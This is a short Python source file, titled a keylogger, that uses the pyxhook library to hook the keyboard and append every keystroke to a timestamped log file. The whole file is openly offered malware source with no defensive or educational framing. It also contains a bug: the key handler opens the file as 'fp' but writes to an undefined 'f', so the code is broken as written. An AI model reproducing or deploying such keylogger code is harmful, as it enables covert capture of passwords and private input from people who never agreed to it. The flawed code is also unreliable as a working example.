"""
Python Script for keylogger
"""

import os
from datetime import datetime
import pyxhook

def main():
   file_name = f'{os.getcwd()}/{datetime.now().strftime("%d-%m-%Y|%H:%M")}.log'
   def OnKeyPress(event):
        with open(file_name, "a") as fp:   #a for append mode
            if event.Key == 'P_Enter':
                f.write('\n')

            else:
                f.write(f"{chr(event.Ascii)}")  #write to the ascii characters readable :)
   new_hook = pyxhook.HookManager()
   new_hook.KeyDown = OnKeyPress

   new_hook.HookKeyboard()  #set the hook

   try:
       new_hook.start()
   except KeyboardInterrupt:
       pass
   except Exception as ex:
       msg = f"Error while scanning events:\n  {ex}"
       pyxhook.print_err(msg)
       with open(file_name,"a") as f:
           f.write(f"\n{msg}")

if __name__ == "__main__":
    main()
